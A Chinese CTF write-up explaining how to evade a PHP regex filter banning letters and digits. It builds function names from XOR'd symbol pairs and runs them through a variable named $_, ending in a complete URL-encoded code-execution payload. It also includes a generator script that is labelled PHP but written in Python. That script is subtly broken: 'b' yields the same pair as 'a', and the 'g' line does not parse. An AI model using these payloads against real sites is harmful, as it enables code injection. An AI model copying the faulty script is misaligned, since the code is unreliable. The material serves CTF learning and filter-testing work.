PHP正则表达式绕过姿势之异或绕过
=================

做web题时经常为绕不过正则表达式匹配而头疼，今天学习了一种新的绕过姿势——异或绕过，可以解决大多数的正则表达式匹配题，可谓是正则表达式大杀器了。

下面我们以一道题为例给大家演示一下这种绕过方法：

以题代讲
----

![image-20211027225234082](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-14b14cfc111ea08f05837ecd683a12a154bd9230.png)

我们现在只关注题目的下半部分，我们发现code中不能出现字母和数字以及+/，过滤的条件极为苛刻，并且通过题目中给出的提示，我们要执行`eval(getflag())`,那我们就需要利用异或绕过的方法

**1.写一个符号两两异或成字母（/数字）的脚本**

例如：

```php
word = input("Input word:")
payload = """"""
for i in word:
    if i == "a":
        payload += '("!"^"@").'
    elif i == "b":
        payload += '("!"^"@").'
    elif i == "c":
        payload += '("#"^"@").'
    elif i == "d":
        payload += '("$"^"@").'
    elif i == "e":
        payload += '("%"^"@").'
    elif i == "f":
        payload += '("&"^"@").'
    elif i == "g":
        payload += '("'"^"@").'
    elif i == "h":
        payload += '("("^"@").'
    elif i == "i":
        payload += '(")"^"@").'
    elif i == "j":
        payload += '("*"^"@").'
    elif i == "k":
        payload += '("+"^"@").'
    elif i == "l":
        payload += '(","^"@").'
    elif i == "m":
        payload += '("-"^"@").'
    elif i == "n":
        payload += '("."^"@").'
    elif i == "o":
        payload += '("/"^"@").'
    elif i == "p":
        payload += '("/"^"_").'
    elif i == "q":
        payload += '("/"^"^").'
    elif i == "r":
        payload += '("."^"\\").'
    elif i == "s":
        payload += '("-"^"^").'
    elif i == "t":
        payload += '("/"^"[").'
    elif i == "u":
        payload += '("("^"]").'
    elif i == "v":
        payload += '("("^"^").'
    elif i == "w":
        payload += '("("^"_").'
    elif i == "x":
        payload += '("&"^"^").'
    elif i == "y":
        payload += '''("'"^"^").'''
    elif i == "z":
        payload += '("&"^"\\").'
    elif i == "A":
        payload += '("!"^"`").'
    elif i == "B":
        payload += '("<"^"~").'
    elif i == "C":
        payload += '("#"^"`").'
    elif i == "D":
        payload += '("$"^"`").'
    elif i == "E":
        payload += '("%"^"`").'
    elif i == "F":
        payload += '("&"^"`").'
    elif i == "G":
        payload += '(":"^"}").'
    elif i == "H":
        payload += '("("^"`").'
    elif i == "I":
        payload += '(")"^"`").'
    elif i == "J":
        payload += '("*"^"`").'
    elif i == "K":
        payload += '("+"^"`").'
    elif i == "L":
        payload += '(","^"`").'
    elif i == "M":
        payload += '("-"^"`").'
    elif i == "N":
        payload += '("."^"`").'
    elif i == "O":
        payload += '("/"^"`").'
    elif i == "P":
        payload += '("@"^"~").'
    elif i == "Q":
        payload += '("-"^"|").'
    elif i == "R":
        payload += '("."^"|").'
    elif i == "S":
        payload += '("("^"{").'
    elif i == "T":
        payload += '("("^"|").'
    elif i == "U":
        payload += '("("^"}").'
    elif i == "V":
        payload += '("("^"~").'
    elif i == "W":
        payload += '(")"^"~").'
    elif i == "X":
        payload += '("#"^"{").'
    elif i == "Y":
        payload += '("$"^"{").'
    elif i == "Z":
        payload += '("$"^"~").'
    else:
        payload += i
print("payload:\n"+payload)
```

这个示例脚本的作用就是将我们输入的一个字母字符串中每个字母字符，是通过哪两个特殊字符异或生成的过程，输出出来。

\**类似的脚本都可以在网上找到，也可以自己写*

例如：输入cat

![image-20211027230037566](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f85411ed9c503e07c72d8ba47e8dd8ed866cd973.png)

打印出来的payload就是cat中每个字符通过特殊字符两两异或的过程，每个字符异或操作用“()”包含，并且用“."连接，这是PHP的语法要求。

这里我们需要输入getflag，得到getflag的payload：

`("'"^"@").("%"^"@").("/"^"[").("&"^"@").(","^"@").("!"^"@").("'"^"@")`

这个payload在php里就会自动运算解析成“getflag”字符串。

**&lt;u&gt;至于PHP为什么将payloads视为字符串？&lt;/u&gt;**

因为^是互斥或运算符，这意味着我们实际上正在使用二进制值。因此，PHP允许我们分解一个值为另外两个值的异或。

二进制值的XOR异或运算符将返回1，其中只有一位为1，否则返回0（0 ^ 0 = 0，0 ^ 1 = 1，1 ^ 0 = 1，1 ^ 1 = 0）。对字符使用XOR异或时，将使用其ASCII值。这些ASCII值是整数，因此我们需要将其转换为二进制值以查看实际情况。

**2.将payload手动编码**

因为有些字符在浏览器中不会被手动编码，所以这里我们必须进行手动编码，这里我使用的是利用hackbar

![image-20211028102109746](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9661d3383bf8f026d1c8520f7640c442b74ce2ec.png)

选中异或构造的payload部分

![image-20211028102229269](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f33f7c4821afc2d045ae099d585b5bdc48a9c7f6.png)

选择 ENCODING -》URL encode

![image-20211028102303351](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7205ac18ff64272de7b470e8cceb9ad31b268b51.png)

效果如下图所示：

![image-20211028102426400](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d756af84b47f26097c578da75d42f7012c721dcb.png)

**3.将payload赋值给一个变量**

这一步是必须的，因为如果直接让 `code = (手动编码过的)payload();`是无法执行的，要让`code = 一个变量 = (手动编码过的)payload;变量名();` 因为先要让一个变量保存payload的异或结果，然后执行这个变量，才能执行我们想要的函数。

**&lt;u&gt;并且这里有一个关键的细节:&lt;/u&gt;**

因为前面的正则表达式ban掉了所有字母和数字，那么我们要用来储存异或构造的运算结果的变量名的选择就很叼钻了，我们来看一下PHP中的变量命名规则：

![image-20211028105057205](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-54f7810a3732fd47a5f41596734027218e8c3a04.png)

初看命名规则我们可能会觉得字母和数字都被ban了，我们肯定无法命名出一个变量了，但是细心的小伙伴可能会发现，还有“\_"（下划线）能用，所以我们构造的变量名就是”\_“，即变量表示为`$_`。

*从这里我们也可以发现如果“\_"（下划线）也被ban了的话，我们也就不能使用异或构造了，因为一定需要有一个变量来储存异或构造的运算结果的。*

所以最终的完整payload为：

`?code=$_=(%22'%22%5E%22%40%22).(%22%25%22%5E%22%40%22).(%22%2F%22%5E%22%5B%22).(%22%26%22%5E%22%40%22).(%22%2C%22%5E%22%40%22).(%22!%22%5E%22%40%22).(%22'%22%5E%22%40%22);$_();`

**4.执行完整payload**

![image-20211028110158545](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-69a1c52c3a6fe5f176a14878cc051c7c5d50df41.png)

最后加上本题的上半部分post传参+数组绕过md5比较就能得到完整的flag了。

总结
--

异或绕过不仅可以应对苛刻的正则表达式匹配，还可以应用于很多不同的需要绕过情况中。具体在什么时候使用异或绕过呢？我个人认为是在需要的字母或数字被ban时，就可以拿出这门大杀器了，但是当“\_"(下划线）也被ban时就不要使用了哦。